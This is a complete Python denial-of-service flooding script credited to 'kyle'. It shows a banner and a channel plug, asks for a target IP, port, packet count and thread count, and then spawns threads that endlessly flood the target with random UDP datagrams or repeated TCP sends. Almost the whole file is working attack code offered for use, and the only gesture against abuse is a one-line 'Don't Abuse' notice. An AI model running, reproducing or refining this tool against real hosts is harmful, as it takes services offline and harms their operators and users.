#!/usr/bin/env python3
#Ddos by kyle
import random
import socket
import threading
import os

os.system("clear")
print("██╗░░██╗██╗░░░██╗██╗░░░░░███████╗")
print("██║░██╔╝╚██╗░██╔╝██║░░░░░██╔════╝")
print("█████═╝░░╚████╔╝░██║░░░░░█████╗░░")
print("██╔═██╗░░░╚██╔╝░░██║░░░░░██╔══╝░░")
print("██║░╚██╗░░░██║░░░███████╗███████╗")
print("╚═╝░░╚═╝░░░╚═╝░░░╚══════╝╚══════╝")








print("------------------------------------------------------------")
print(" » Subscribe My Channel : Nasywan EHD«")
print(" »      Don't Abuse bitch          «")
print(" »   TOOLS BY KYLE «")
print("------------------------------------------------------------")
ip = str(input(" DDoSAttackByKyle | Ip:"))
port = int(input(" DDoSAttackByKyle | Port:"))
choice = str(input(" DDoSAttackByKyle | Gas Gak Ni?(y/n):"))
times = int(input(" DDoSAttackByKyle | Packets:"))
threads = int(input(" DDoSAttackByKyle | Threads:"))
def run():
	data = random._urandom(12288)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Kyle Menyenggol ")
		except:
			print("[!] KYLE IS HERE DUDE! ")

def run2():
	data = random._urandom(128)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Kyle Menyenggol ")
		except:
			s.close()
			print("[*] KYLE IS HERE DUDE! ")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
